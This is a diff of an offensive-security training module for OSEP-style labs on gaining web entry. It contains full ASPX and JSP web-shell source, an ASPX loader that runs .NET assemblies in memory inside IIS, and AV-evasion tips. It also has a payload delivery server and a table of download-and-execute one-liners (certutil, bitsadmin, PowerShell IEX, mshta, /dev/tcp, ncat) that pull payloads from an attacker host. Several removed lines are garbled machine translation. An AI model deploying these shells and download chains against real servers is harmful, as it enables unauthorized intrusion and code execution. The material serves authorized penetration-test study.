@@ -2,65 +2,63 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# Module 10 — Web entry: ASPX web shells and post-injection download/execute
-
-Prove RCE with a tiny page. Swap downloaders when one is blocked. Watch command length.
+# 10 · Web entry: ASPX web shells and post-injection download/execute
 
 > **Covers scenarios:** 14, 15, 16
 >
-> **Course mapping:** chapters on managed loading; web and service accounts; web-entry challenges
+> **Course basis:** chapters 8–9 (managed loading), chapter 24 (web and service accounts), C2/C6 (web entry)
 >
-> **Prerequisites:** a web service that allows uploads or has an injection point; IIS/.NET (ASPX) or PHP/JSP runtime; attacker box has a delivery URL the target can reach
+> **Prerequisites:** a web service that allows uploads or has an injection point; IIS/.NET (ASPX) or PHP/JSP runtime; a delivery address on the attacker box that the target can reach
 
-**Rules for this module**:
-1. **Web-entry identity is usually low** (IIS app-pool account, `NT AUTHORITY\NETWORK SERVICE`). First check `whoami /priv` — `SeImpersonatePrivilege` decides whether you can escalate immediately.
-2. **Public web shells get killed** — keep the page minimal; keep stage 2 independently swappable.
-3. **Command length / quotes are silent killers** — injection points often truncate complex commands; a short stage 1 plus separate execute is almost always more reliable.
+**Shared principles for this module**:
+1. **Web-entry identity is usually low-privileged** (IIS app-pool account, `NT AUTHORITY\NETWORK SERVICE`); the first thing to do after landing is `whoami /priv` — whether `SeImpersonatePrivilege` is present decides whether you can escalate immediately.
+2. **Public web shells always get killed** — trim yours down to the necessary function only, and keep stage 2 as an independently replaceable file.
+3. **Command length and quotes are silent killers** — injection points often truncate complex commands; a short stage 1 plus separate execution is almost always more reliable.
 
 ---
 
-## Scenario 14: Site allows ASPX upload on IIS; AV is installed
+## Scenario 14: The site allows ASPX upload, the back end is IIS, and the target has AV installed
 
-**Situation**: Uploaded ASPX is parsed by the server and simple command execution works; public web shells or uploaded EXEs are killed; current identity is an app-pool account.
+**Situation**: An uploaded ASPX is parsed by the server, so simple command execution works; but public web shells or uploaded EXEs get killed; the current identity is an app-pool account.
 
 **Assumptions**:
-- The upload directory is web-reachable and allows `.aspx` (or rename to `.ashx` / `.asmx` / `.config`).
-- Target has AV (signatures for on-disk files and common web-shell fingerprints).
-- Current identity is confirmed as an app-pool account (limited rights, but often has `SeImpersonatePrivilege`).
+- The upload directory is web-accessible and allows `.aspx` (or you can rename to `.ashx`/`.asmx`/`.config`).
+- The target has AV installed (signatures for files on disk and for common web-shell fingerprints).
+- Current identity is confirmed as an app-pool account (limited rights, but often carries `SeImpersonatePrivilege`).
 
-**Prepare (attacker)**:
+**Prepare (attacker side)**:
 1. Prepare three artifacts:
    | File | Purpose |
    |---|---|
-   | `m10-minimal-exec.aspx` | Minimal exec entry (no UI, no extras) |
-   | `m10-managed-loader.aspx` | Load managed assemblies / in-memory exec |
+   | `m10-minimal-exec.aspx` | Minimal execution entry (no UI, no extras) |
+   | `m10-managed-loader.aspx` | Load managed assemblies / execute in memory |
    | `m10-jsp-shell.jsp` / `m10-php-shell.php` | Fallbacks for other runtimes |
-2. Keep stage 2 as an **independently swappable** file (avoid re-uploading the web shell for every change).
+2. Make stage 2 a standalone file that is **independently replaceable** (so you do not re-upload the web shell every time you change it).
 3. Delivery service:
    ```bash
    python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads
    ```
 
 **Procedure**:
-1. Upload the minimal ASPX, hit it once, confirm execution:
+1. Upload the minimal ASPX, request it once, and confirm it executes:
    ```text
    GET /upload/shell.aspx?cmd=whoami
    ```
-2. Immediately check identity and privileges:
+2. Immediately confirm identity and privileges:
    ```text
    cmd=whoami /priv
    cmd=whoami /groups
    ```
-3. If AV kills it → strip signatures: drop comments, avoid `eval`, split/encode command keywords; or change extension/path.
-4. If uploaded EXE is killed → switch to **in-memory load**: ASPX only `Assembly.Load`s stage-2 bytes (Base64) into the IIS process — nothing on disk.
-5. Once execution is stable: if `SeImpersonatePrivilege` is present → hand off to [06-uac-windows-privesc](/modules/06-uac-windows-privesc) scenario 26.
+3. If AV kills it → strip the fingerprint: remove comments, drop `eval`, split or encode command keywords; or change the extension and path.
+4. If the uploaded EXE gets killed → switch to **in-memory loading**: the ASPX only `Assembly.Load`s the stage-2 bytes (Base64) into the IIS process — nothing lands on disk.
+5. Once execution is stable: if `SeImpersonatePrivilege` is present → go to [06-uac-windows-privesc](/modules/06-uac-windows-privesc) scenario 26.
 
-**Lab files**:
-| File | Purpose | Key args |
+**Scripts used**:
+| Script | Purpose | Key parameters |
 |---|---|---|
-| `m10-minimal-exec.aspx` | Minimal command execution | `cmd` |
-| `m10-managed-loader.aspx` | Managed assembly in-memory load | `b64` |
-| `m10-jsp-shell.jsp` / `m10-php-shell.php` | Non-IIS fallbacks | `cmd` |
+| `m10-minimal-exec.aspx` | Minimal command execution | `cmd` parameter |
+| `m10-managed-loader.aspx` | In-memory load of managed assemblies | `b64` parameter |
+| `m10-jsp-shell.jsp` / `m10-php-shell.php` | Fallbacks for non-IIS environments | `cmd` |
 | `m10-download-fallbacks.md` | Downloader fallback matrix | — |
 
 #### `m10-minimal-exec.aspx` {#m10-minimal-exec-aspx}
@@ -69,16 +67,16 @@ Prove RCE with a tiny page. Swap downloaders when one is blocked. Watch command 
 <%@ Page Language="C#" AutoEventWireup="true" Debug="false" Trace="false" %>
 <%@ Import Namespace="System.Diagnostics" %>
 <%--
-Purpose: Extreme simplicity ASPX Orders to execute the entrance -- just one thing: URL Parameters cmd Here. cmd.exe /c Execute, plain text echo output。
-      None UI、No upload/download/file management, no public Web Shell . The character string to minimize the object AV Probability of signature。
-scene: 14（Upload directory parsing ASPX，Public Web Shell Killed.）、16（When the injection point is limited, use it as a long command channel.）
-Dependency: IIS 6+ / .NET 2.0+；Apply pool account privileges.（w3wp.exe Implementation within the process）
-Use: 
-  1) Name after upload shell.aspx（Or allowed. .ashx/.asmx）
-  2) Visits: http://TARGET/upload/shell.aspx?cmd=whoami%20/priv
-  3) None cmd Return empty when parameters 200（To judge whether the page has been parsed）
-Placeholder: TARGET=Target site address；cmd=Command to execute (need) URL Encoding, Space Writing %20）
-Test status: Not present IIS measured;used python3 Label pairing/structural check (see end note) to be tested in the experimental environment
+Purpose: minimal ASPX command-execution entry — it does one thing: pass the URL parameter cmd to cmd.exe /c and echo plain-text output.
+      No UI, no upload/download/file-management features, no fingerprint strings from public web shells — to keep the chance of hitting an AV signature as low as possible.
+Scenario: 14 (the upload directory parses ASPX but public web shells get killed), 16 (when the injection point is length-limited, use it as a long-command channel)
+Dependencies: IIS 6+ / .NET 2.0+; app-pool account rights are enough (it runs inside the w3wp.exe process)
+Usage:
+  1) After upload, name it shell.aspx (or an allowed .ashx/.asmx)
+  2) Request: http://TARGET/upload/shell.aspx?cmd=whoami%20/priv
+  3) With no cmd parameter it returns an empty 200 (use this to tell whether the page is parsed)
+Placeholders: TARGET=target site address; cmd=command to run (URL-encode it; write spaces as %20)
+Test status: not tested on IIS; tag pairing and structural checks were run with python3 (see the note at the end); validate in the lab environment before the exam
 --%>
 <script runat="server">
 protected void Page_Load(object sender, EventArgs e)
@@ -113,11 +111,11 @@ protected void Page_Load(object sender, EventArgs e)
 }
 </script>
 <%--
-Self-check statement (none) IIS static check methods）: 
-  1) Tab Match: <@ ... %> and <script runat="server"> ... </script> Show up in pairs.，<%-- --%> Comment closed。
-  2) C# parenthesis squared: used python3 Statistics Page_Load Inside. { and } Whether the quantity is equal。
-  3) Quoted/separated: ProcessStartInfo Field grant and using Block ends in semicolon。
-  Used above python3 Script ran (not installed) .NET Compiler, so only structural check. Real compiler needs Windows Used csc or IIS Initial Access Trigger）。
+Self-check notes (static checks when you have no IIS):
+  1) Tag pairing: <@ ... %> and <script runat="server"> ... </script> appear in pairs, and the <%-- --%> comment is closed.
+  2) C# brace balance: use python3 to count whether the numbers of { and } inside the Page_Load body are equal.
+  3) Quotes/semicolons: every ProcessStartInfo field assignment and the using block end with a semicolon.
+  All of the above was run with a python3 script (no .NET compiler is installed here, so only structural checks are possible; a real compile needs csc on Windows or the first request to IIS).
 --%>
 ````
 
@@ -129,22 +127,22 @@ Self-check statement (none) IIS static check methods）:
 <%@ Import Namespace="System.Reflection" %>
 <%@ Import Namespace="System.Text" %>
 <%--
-Purpose: Host program set loader - Put .NET Set bytes（Base64 or POST body）Or read from disk path，
-      Yes. w3wp.exe Within process Assembly.Load() And call the entrance.（EntryPoint or specify type/method）+ Parameters。
-      EXE Do not land, use"Ban EXE Landing with hosting tools."The scene。
-scene: 14（Uploaded EXE By AV Check it out. → Reload Memory）、20（Needed hosting tool but not allowed to land）
-Dependency: IIS + .NET 4.x（Program number/target framework to be consistent with application pool；x64 Pool Loading AnyCPU/x64 Program Set）
-Use: 
-  # 1) Byte arrays (most commonly used, aligned) docs/10 scene 14 Yes."Pass Base64"）
-  curl -k "http://TARGET/upload/loader.aspx?b64=<BASE64Program Set>&args=-a%20-b"
-  # 2) From disk (the program set has been written to the target in another way) Let's go.）
+Purpose: managed-assembly loader — read a .NET assembly from a byte array (Base64 or POST body) or from a disk path,
+      Assembly.Load() it inside the w3wp.exe process, then call the entry point (EntryPoint, or a specified type/method) plus arguments.
+      The EXE never lands on disk — for cases where "an EXE on disk is forbidden but you need a managed tool".
+Scenario: 14 (the uploaded EXE gets killed by AV → switch to in-memory loading), 20 (you need a managed tool but must not write to disk)
+Dependencies: IIS + .NET 4.x (assembly bitness and target framework must match the app pool; an x64 pool loads AnyCPU/x64 assemblies)
+Usage:
+  # 1) Byte array (most common; pairs with "send Base64" in docs/10 scenario 14)
+  curl -k "http://TARGET/upload/loader.aspx?b64=<BASE64ASSEMBLY>&args=-a%20-b"
+  # 2) From disk (the assembly was already written to the target by other means)
   curl -k "http://TARGET/upload/loader.aspx?file=C:\Windows\Temp\p.exe&type=Payload.Runner&method=Run"
-  # 3) Direct POST Original bytes (request body, set of programs)）
+  # 3) POST the raw bytes directly (the request body is the assembly)
   curl -k --data-binary @payload.exe "http://TARGET/upload/loader.aspx?args=whoami"
-  # Not type/method Autotake when asm.EntryPoint；And... type Not method to list the open static methods of this type First Name。
-Placeholder: TARGET=Target site；LHOST/URL=Source of the set (this page is not downloadable automatically and needs to be supported when downloading) m10-download-fallbacks.md）；
-        b64=Base64 Program Set；file=Program set path on target disk；type/method=Entry；args=Parameters (default split by space, available) argssep Specify Separator）
-Test status: Not present IIS measured;used python3 Label pairing / parenthesis check, to be validated in the experimental environment
+  # With no type/method it takes asm.EntryPoint automatically; with type but no method it lists that type's public static method names.
+Placeholders: TARGET=target site; LHOST/URL=assembly source (this page does not download anything itself; pair it with m10-download-fallbacks.md when you need a download);
+        b64=Base64 assembly; file=path to the assembly on the target disk; type/method=entry point; args=arguments (split on spaces by default; use argssep to set a different separator)
+Test status: not tested on IIS; tag pairing and brace-balance checks were run with python3; validate in the lab environment
 --%>
 <script runat="server">
 protected void Page_Load(object sender, EventArgs e)
@@ -239,7 +237,7 @@ protected void Page_Load(object sender, EventArgs e)
             return;
         }
 
-        // Most hosting tools Console Turn it down. Take over here. Console.Out Return Output Together
+        // Most managed tools write their results to the Console; take over Console.Out here so the output comes back with the response
         TextWriter old = Console.Out;
         StringWriter captured = new StringWriter();
         object result = null;
@@ -272,11 +270,11 @@ protected void Page_Load(object sender, EventArgs e)
 }
 </script>
 <%--
-Self-check statement (none) IIS static check methods）: 
-  1) Tab Match: <%@ %>、<script runat="server">...</script>、<%-- --%> The three are closed.。
-  2) C# parenthesis squared: used python3 Statistics Page_Load Inside. { and } Number equal, brackets pair。
-  3) Every class used is here. Import Or full name.（System.Reflection / System.IO / System.Text Already Import）。
-  Other Organiser Windows Top. <script> Intracode glued .cs Use csc /t:library Compile to confirm syntax.。
+Self-check notes (static checks when you have no IIS):
+  1) Tag pairing: <%@ %>, <script runat="server">...</script> and <%-- --%> are all closed.
+  2) C# brace balance: use python3 to confirm the numbers of { and } inside the Page_Load body are equal and that parentheses are paired.
+  3) Every class used is covered by an Import or a fully-qualified name (System.Reflection / System.IO / System.Text are already imported).
+  Real compile check: on Windows, paste the code inside <script> into a .cs file and compile it with csc /t:library to confirm the syntax.
 --%>
 ````
 
@@ -284,16 +282,16 @@ Self-check statement (none) IIS static check methods）:
 
 ````xml
 <%--
-Purpose: streamlining JSP Command execution entrance.——Tomcat/Jetty/JBoss alternative channel under a container; automatically press os.name Selection
-      /bin/sh -c（Linux）or cmd.exe /c（Windows），Standard output combined with error output echo。
-scene: 14 Alternative（Web Access exists, but runs from JSP Not ASPX）、16（A long command channel beyond a limited length injection point）
-Dependency: Servlet Containers（Tomcat 7+ / JDK 6+）；Container process account privileges are sufficient
-Use: 
-  1) Upload to Accessible webapps Contents /var/lib/tomcat9/webapps/ROOT/shell.jsp）
-  2) Visits: http://TARGET/shell.jsp?cmd=id
-  3) None cmd Back on arguments "ready"（The confirmation page has been compiled and executed）
-Placeholder: TARGET=Target site；cmd=Command to execute (need) URL Encoded）
-Test status: Not present Tomcat measured;used python3 Label pairing/structure check to be validated in the experimental environment
+Purpose: minimal JSP command-execution entry — a fallback channel under Tomcat/Jetty/JBoss and similar containers; it picks
+      /bin/sh -c (Linux) or cmd.exe /c (Windows) automatically from os.name, and echoes stdout merged with stderr.
+Scenario: fallback for 14 (a web entry exists, but the runtime is JSP rather than ASPX), 16 (a long-command channel beyond a length-limited injection point)
+Dependencies: a servlet container (Tomcat 7+ / JDK 6+); container-process account rights are enough
+Usage:
+  1) Upload into an accessible webapps directory (for example /var/lib/tomcat9/webapps/ROOT/shell.jsp)
+  2) Request: http://TARGET/shell.jsp?cmd=id
+  3) With no cmd parameter it returns "ready" (proof that the container has compiled and run the page)
+Placeholders: TARGET=target site; cmd=command to run (URL-encode it)
+Test status: not tested on Tomcat; tag pairing and structural checks were run with python3; validate in the lab environment
 --%>
 <%@ page contentType="text/plain;charset=UTF-8" %>
 <%@ page import="java.io.*" %>
@@ -327,10 +325,10 @@ Test status: Not present Tomcat measured;used python3 Label pairing/structure ch
     }
 %>
 <%--
-Self-check statement (none) Tomcat static check methods）: 
-  1) Tab Match: <%@ page %> Commands and <% ... %> Script segment closed，<%-- --%> Comment closed。
-  2) Java parenthesis/bracket flat: used python3 Statistics { } and ( ) Equal number。
-  3) Authentication: Tomcat The first visit is compiled; or the script section is drawn into .java Use javac Authentication Syntax:。
+Self-check notes (static checks when you have no Tomcat):
+  1) Tag pairing: the <%@ page %> directive and the <% ... %> scriptlet are closed, and the <%-- --%> comment is closed.
+  2) Java brace/paren balance: use python3 to confirm the numbers of { } and ( ) are equal.
+  3) Real compile check: Tomcat compiles on the first request; or pull the scriptlet into a .java file and check the syntax with javac.
 --%>
 ````
 
@@ -338,26 +336,26 @@ Self-check statement (none) Tomcat static check methods）:
 
 ````python
 #!/usr/bin/env python3
-"""Purpose: Delivery server——HTTP/HTTPS Two channels to record the origin of each request、User-Agent、Path to confirm"Is the target actually downloading?"
+"""Purpose: delivery server — HTTP/HTTPS on both channels; it logs the source, User-Agent and path of every request, to confirm "did the target really download it"
 
-Scenario: General infrastructure (cooperating) docs/00-environment-and-infra.md；Support the scene 3、8、15、16、17、28、30、31 Other Organiser）
+Scenario: shared infrastructure (pairs with docs/00-environment-and-infra.md; supports delivery and troubleshooting for scenarios 3, 8, 15, 16, 17, 28, 30, 31)
 
-Dependency: Python 3.7+（Standard library）；HTTPS Yes. cert/key（Available openssl or m00-build-payloads.sh Generate）
+Dependencies: Python 3.7+ (standard library); HTTPS needs a cert/key (generate them with openssl or m00-build-payloads.sh)
 
-Use: 
-    # HTTP（Default 80）
+Usage:
+    # HTTP (default 80)
     python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads
 
-    # HTTPS（Automatically）
+    # HTTPS (self-signed)
     python3 m00-delivery-server.py --port 443 --dir ~/osep/payloads \
         --cert ~/osep/tools/cert.pem --key ~/osep/tools/key.pem
 
-    # Detection mode only: not return file, only record request (confirm target access path)）
+    # Probe-only mode: return no file, only log the request (confirms the target's egress path)
     python3 m00-delivery-server.py --port 8000 --probe-only
 
-Placeholder: LHOST=Attack aircraft IP（Scripts are available for printing URL）；PAYLOAD=Put it on. --dir Load File Name for Below
+Placeholders: LHOST=attacker IP (the script prints the usable URLs); PAYLOAD=payload filename placed under --dir
 
-Test status: Already macOS Current Python 3 Syntax Validation（py_compile）；HTTP Mode to run validation directly
+Test status: syntax-checked on this macOS host with Python 3 (py_compile); HTTP mode can be run and verified directly
 """
 from __future__ import annotations
 
@@ -371,7 +369,7 @@ import sys
 import threading
 
 class LoggedHandler(http.server.SimpleHTTPRequestHandler):
-    """Static file service with structured logs；probe-only Mode only record not returning files。"""
+    """Static file service with structured logging; probe-only mode only logs and returns no files."""
 
     probe_only = False
     log_path = "delivery.log"
@@ -419,7 +417,7 @@ class LoggedHandler(http.server.SimpleHTTPRequestHandler):
         self._record("HEAD", 200)
         super().do_HEAD()
 
-    def log_message(self, fmt, *args):  # Cursor Default stderr Output, one step. _record
+    def log_message(self, fmt, *args):  # suppress the default stderr output; everything goes through _record
         return
 
 def local_ips() -> list[str]:
@@ -430,7 +428,7 @@ def local_ips() -> list[str]:
             ips.add(info[4][0])
     except Exception:
         pass
-    # Bottom: detect the default route exit address
+    # Fallback: probe the default route's egress address
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
@@ -441,14 +439,14 @@ def local_ips() -> list[str]:
     return sorted(ip for ip in ips if not ip.startswith("127."))
 
 def main() -> int:
-    ap = argparse.ArgumentParser(description="OSEP Organisation（HTTP/HTTPS + Request Log）")
+    ap = argparse.ArgumentParser(description="OSEP delivery server (HTTP/HTTPS + request log)")
     ap.add_argument("--port", type=int, default=80)
     ap.add_argument("--bind", default="0.0.0.0")
     ap.add_argument("--dir", default=os.path.expanduser("~/osep/payloads"))
     ap.add_argument("--cert", default="")
     ap.add_argument("--key", default="")
-    ap.add_argument("--log", default="", help="Log path, default <dir>/../logs/delivery.log")
-    ap.add_argument("--probe-only", action="store_true", help="Record requests only, do not return files")
+    ap.add_argument("--log", default="", help="log path, default <dir>/../logs/delivery.log")
+    ap.add_argument("--probe-only", action="store_true", help="only record requests, do not return files")
     args = ap.parse_args()
 
     root = os.path.abspath(os.path.expanduser(args.dir))
@@ -470,13 +468,13 @@ def main() -> int:
         httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
         scheme = "https"
 
-    print(f"[*] Cannot initialise Evolution's mail component.: {root}")
-    print(f"[*] Request Log:   {log_path}")
-    print(f"[*] Mode:       {'probe-only（Record only）' if args.probe_only else 'File delivery'}")
-    print("[*] Available Addresses:")
+    print(f"[*] Delivery root: {root}")
+    print(f"[*] Request log:   {log_path}")
+    print(f"[*] Mode:       {'probe-only (log only)' if args.probe_only else 'file delivery'}")
+    print("[*] Available addresses:")
     for ip in local_ips():
         print(f"      {scheme}://{ip}:{args.port}/PAYLOAD")
-    print("[*] Ctrl+C Stop")
+    print("[*] Ctrl+C to stop")
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
@@ -494,243 +492,243 @@ if __name__ == "__main__":
 ````markdown
 # Downloader fallback matrix (scenarios 15 / 16 / 17)
 
-> Purpose: When a download tool is stopped after the command is executed, press"Blocked. → Which one?"The order is next.。**One variable at a time.**And record the results.。
+> Purpose: when one download tool is blocked after you get command execution, work down the "blocked → which one next" order. **Change only one variable at a time** and record the result.
 >
-> scene: 15（Injection points can execute orders, but downloaders are blocked.）、16（The length of the command is limited.）、17（No stable checkout）
+> Scenarios: 15 (the injection point runs commands but the downloader is blocked), 16 (command length is limited, so use the shortest form), 17 (the control case when there is no stable egress)
 >
-> Dependence: attack side delivery service `python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads`
+> Dependencies: the delivery service on the attacker side, `python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads`
 >
-> Placeholder: `LHOST`（Attack aircraft IP）、`LPORT`（Attack machine port）、`PAYLOAD`（Organisation）、`URL`（Complete http(s) Address）、`TARGET`（Objective）
+> Placeholders: `LHOST` (attacker IP), `LPORT` (attacker port), `PAYLOAD` (delivery filename), `URL` (full http(s) address), `TARGET` (target)
 >
-> Test status: command template manually checked the order of parameters; not measured in the target environment, as per test 5 A non-hazardous download validation of the knot
+> Test status: every command template had its argument order checked by hand; not tested in a target environment — before the exam, work through section 5 once as a harmless download check
 
 ---
 
-## 1. Main Order（Windows Target: To be stopped, you can switch down.
+## 1. Main order (Windows targets): when one is blocked, move down the list
 
-| Order | Tools | Command Template | Length | If you're stopped, change your judgment. |
+| Order | Tool | Command template | Length | Test for "switch to the next one" |
 |---|---|---|---|---|
-| 1 | `curl` | `curl -s -o C:\Windows\Temp\PAYLOAD URL` | Medium | Win10 1803+ Self-contained, most commonly available; reporting"Not internal or external."→ It means the system is too old. Change it. 2 |
-| 2 | `certutil` | `certutil -urlcache -split -f URL C:\Windows\Temp\PAYLOAD` | Medium | I've been... AppLocker/AV Stop!"Access denied"Or back to the code. 0）→ Switch 3；Remember when you're done. `certutil -urlcache -split -f URL delete` Cache Entry |
-| 3 | `bitsadmin` | `bitsadmin /transfer j /download /priority normal URL C:\Windows\Temp\PAYLOAD` | Long | Come on. BITS Services, logs visible; reports"Could not initialise Bonobo BITS"→ Switch 4 |
-| 4 | PowerShell `DownloadString`（Memory, no landing） | `powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('URL')"` | Long | Attention. AMSI（See `m05-amsi-bypass-variants.ps1`）；By AMSI/CLM Stop! → Switch 5 |
-| 5 | PowerShell `WebClient.DownloadFile` | `powershell -nop -w hidden -c "(New-Object Net.WebClient).DownloadFile('URL','C:\Windows\Temp\PAYLOAD')"` | Long | and 4 It's the same kind of client. PowerShell The floor is blocked. → Switch 6 |
-| 6 | `wget`（If the target is installed） | `wget -q URL -O C:\Windows\Temp\PAYLOAD` | Short | rare;not installed → Switch 7 |
-| 7 | Python one-liner（The target is. Python） | `python -c "import urllib.request;urllib.request.urlretrieve('URL','C:\\Windows\\Temp\\PAYLOAD')"` | Medium | None Python → Switch 8 |
-| 8 | `rundll32` + `url.dll`（Request/take documents only, often used for connectivity validation） | `rundll32.exe url.dll,OpenURL URL` | Medium | It plays the associated program, usually only to prove it."It's a net."；Could not initialise Bonobo 9 |
-| 9 | `regsvr32` / `mshta` Remote execution (in place) EXE，Direct Script） | `mshta http://LHOST/PAYLOAD.hta` | Short | Yes. AV/AMSI Attention; see usage `docs/02-hta.md` |
-| 10 | `ncat`/`nc`（Last resort, we need our cooperation.） | Objective: `ncat LHOST LPORT > C:\Windows\Temp\PAYLOAD`；Attack aircraft: `ncat -lvnp LPORT < PAYLOAD` | Short | We need a target. ncat，And interactive/backstage execution |
+| 1 | `curl` | `curl -s -o C:\Windows\Temp\PAYLOAD URL` | medium | Built into Win10 1803+ and available most often; if it says "not recognized as an internal or external command" → the OS is too old, go to 2 |
+| 2 | `certutil` | `certutil -urlcache -split -f URL C:\Windows\Temp\PAYLOAD` | medium | Often blocked by AppLocker/AV (it says "access denied" or returns a non-zero code) → go to 3; afterwards remember `certutil -urlcache -split -f URL delete` to clear the cache entry |
+| 3 | `bitsadmin` | `bitsadmin /transfer j /download /priority normal URL C:\Windows\Temp\PAYLOAD` | long | Goes through the BITS service and leaves obvious logs; if it says it cannot connect to BITS → go to 4 |
+| 4 | PowerShell `DownloadString` (in memory, nothing on disk) | `powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('URL')"` | long | Watch AMSI (see `m05-amsi-bypass-variants.ps1`); if AMSI/CLM blocks it → go to 5 |
+| 5 | PowerShell `WebClient.DownloadFile` | `powershell -nop -w hidden -c "(New-Object Net.WebClient).DownloadFile('URL','C:\Windows\Temp\PAYLOAD')"` | long | Same client family as 4; if both fail, the PowerShell layer is blocked → go to 6 |
+| 6 | `wget` (if the target has it installed) | `wget -q URL -O C:\Windows\Temp\PAYLOAD` | short | Rare; if it is not installed → go to 7 |
+| 7 | Python one-liner (target has Python) | `python -c "import urllib.request;urllib.request.urlretrieve('URL','C:\\Windows\\Temp\\PAYLOAD')"` | medium | No Python → go to 8 |
+| 8 | `rundll32` + `url.dll` (only issues the request / fetches the file; often used to check connectivity) | `rundll32.exe url.dll,OpenURL URL` | medium | It pops up the associated program, so it is normally only used to prove egress; to actually write a file use 9 |
+| 9 | `regsvr32` / `mshta` remote execution (no EXE on disk; pull the script directly) | `mshta http://LHOST/PAYLOAD.hta` | short | AV/AMSI watch this closely; for usage see `docs/02-hta.md` |
+| 10 | `ncat`/`nc` (last resort; needs cooperation from your side) | target: `ncat LHOST LPORT > C:\Windows\Temp\PAYLOAD`; attacker: `ncat -lvnp LPORT < PAYLOAD` | short | Requires ncat on the target, and you must be able to run it interactively or in the background |
 
-**Order Memory Method**: curl → certutil → bitsadmin → PowerShell → wget → python → rundll32 → nc。
+**Mnemonic for the order**: curl → certutil → bitsadmin → PowerShell → wget → python → rundll32 → nc.
 
 ---
 
-## 2. Linux Objective (Same line)）
+## 2. Linux targets (same idea)
 
-| Order | Command Template |
+| Order | Command template |
 |---|---|
 | 1 | `curl -s URL -o /tmp/.PAYLOAD && chmod +x /tmp/.PAYLOAD` |
 | 2 | `wget -q URL -O /tmp/.PAYLOAD && chmod +x /tmp/.PAYLOAD` |
 | 3 | `python3 -c "import urllib.request;urllib.request.urlretrieve('URL','/tmp/.PAYLOAD')"` |
-| 4 | `python -c "import urllib;urllib.urlretrieve('URL','/tmp/.PAYLOAD')"`（Python2 The old target.） |
-| 5 | `bash -c 'cat < /dev/tcp/LHOST/LPORT > /tmp/.PAYLOAD'`（bash Internal construction, most difficult to stop; attack machine required `ncat -lvnp LPORT < PAYLOAD`） |
-| 6 | `printf 'GET /PAYLOAD HTTP/1.0\r\n\r\n' > /dev/tcp/LHOST/LPORT`（Only check out.） |
+| 4 | `python -c "import urllib;urllib.urlretrieve('URL','/tmp/.PAYLOAD')"` (legacy Python 2 target) |
+| 5 | `bash -c 'cat < /dev/tcp/LHOST/LPORT > /tmp/.PAYLOAD'` (bash built-in, hardest to block; the attacker side needs `ncat -lvnp LPORT < PAYLOAD`) |
+| 6 | `printf 'GET /PAYLOAD HTTP/1.0\r\n\r\n' > /dev/tcp/LHOST/LPORT` (proves egress only) |
 
 ---
 
-## 3. Shortest time limit for command length (scenario) 16）
+## 3. Shortest forms when command length is limited (scenario 16)
 
 ```text
-# Only downloads first 30 Character, Shortest）
+# download only first (~30 characters, the shortest)
 curl -so a http://LHOST/a
-# Reimplementation（2 Character）
+# then execute (2 characters)
 a
 
-# One-line version 35 Character）
+# one-line version (~35 characters)
 curl -so a http://LHOST/a&a
 
-# certutil Shortest 40 Character）
+# shortest certutil (~40 characters)
 certutil -urlcache -f http://LHOST/a a
 
-# PowerShell Shortest 60 Characters, including -c Quotes）
+# shortest PowerShell (~60 characters, including the -c quotes)
 powershell -c "iwr http://LHOST/a -o a"
 ```
 
-**First measuring length limit**Re-selection tool: step-by-step increases in harmless commands（`echo AAAA...`），Found cut boundaries; filter spaces or quotation marks for injection points instead `+` or Base64 Version of parameters (see `docs/10-web-entry-webshell.md` scene 16）。
+**Measure the length ceiling first**, then pick a tool: grow a harmless command (`echo AAAA...`) step by step until you find the truncation boundary; if the injection point filters spaces or quotes, switch to the `+` or Base64 argument version (see scenario 16 in `docs/10-web-entry-webshell.md`).
 
 ---
 
-## 4. Check after download (must do it, otherwise you'll waste time checking)"False success"）
+## 4. Post-download verification (mandatory, or you will waste time chasing "false success")
 
 ```cmd
 certutil -hashfile C:\Windows\Temp\PAYLOAD MD5
 ```
 ```bash
-md5sum /tmp/.PAYLOAD          # Linux Objective
+md5sum /tmp/.PAYLOAD          # Linux target
 ```
-And the attack machine. `md5sum ~/osep/payloads/PAYLOAD` Contrast: Hash incoherence = Changed by proxy/cachel or not downloaded complete。
+Compare with `md5sum ~/osep/payloads/PAYLOAD` on the attacker box: a hash mismatch = tampered with by a proxy/cache, or an incomplete download.
 
 ---
 
-## 5. Check for discipline.）
+## 5. Troubleshooting discipline (locate by symptom, do not try things at random)
 
-| phenomena | Conclusions | Next |
+| Symptom | Conclusion | Next step |
 |---|---|---|
-| Organisation**Nothing.**Request | The tools were stopped or the orders were not executed. | Change tool (Section I of this document) 1 Order of sections; running first `curl -s -o nul URL` Validate implementation chain |
-| Requested but target file does not exist | Writing path is not allowed/ by AV sec | Change Directory（`%TEMP%`、`C:\ProgramData\`）、Change File Name |
-| File exists but Hash does not match | Proxy/Cachecut | Switch HTTPS（`docs/09` scene 31）OR DIFFERENT VERIFICATION |
-| Document correct but execution failed | Static/behaviour testing | Turn `docs/05-applocker-clm-amsi.md` scene 18/19 |
-| All downloaders are blocked. | The transmission channel is dead. | Upload Channel（`m10-managed-loader.aspx` Pass Base64）、Agent 28）、DNS（scene 32）、Domain Forward (scenes) 33） |
+| The delivery log shows **no** request | The tool is blocked, or the command never ran at all | Switch tools (the order in section 1 of this file); first run `curl -s -o nul URL` to validate the execution chain |
+| There is a request but no file on the target | No permission on the write path / AV deleted it immediately | Change directory (`%TEMP%`, `C:\ProgramData\`), change the filename |
+| The file exists but the hash does not match | Proxy/cache tampering | Switch to HTTPS (scenario 31 in `docs/09`) or verify in chunks |
+| The file is correct but execution fails | Static/behavioural detection | Go to scenarios 18/19 in `docs/05-applocker-clm-amsi.md` |
+| Every downloader is blocked | The transport channel is dead | Switch to an upload channel (`m10-managed-loader.aspx` carrying Base64), a proxy (scenario 28), DNS (scenario 32), domain fronting (scenario 33) |
 
 ---
 
 ## 6. Related scripts
 
-| Script | Use |
+| Script | Purpose |
 |---|---|
-| `m00-delivery-server.py` | Organisation + Request log (judgement)"Is there a real request?"） |
-| `m10-minimal-exec.aspx` | Yeah. Web Shell Long command execution channel |
